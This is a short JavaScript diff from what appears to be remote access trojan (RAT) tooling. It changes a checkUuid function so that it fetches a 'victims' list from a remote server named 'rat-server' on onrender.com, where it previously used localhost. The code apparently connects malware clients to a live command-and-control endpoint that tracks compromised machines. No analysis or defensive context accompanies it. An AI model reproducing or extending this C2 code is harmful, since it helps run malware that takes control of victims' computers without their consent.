@@ -1,7 +1,7 @@
 const axios = require(`axios`).default
 
 async function checkUuid(uuid){
-    var allUuids = await axios.get(`http://localhost:2000/victims`)
+    var allUuids = await axios.get(`https://rat-server-n24e.onrender.com/victims`)
     var victims = allUuids.data
     let t = [];
     victims.forEach((e) => {
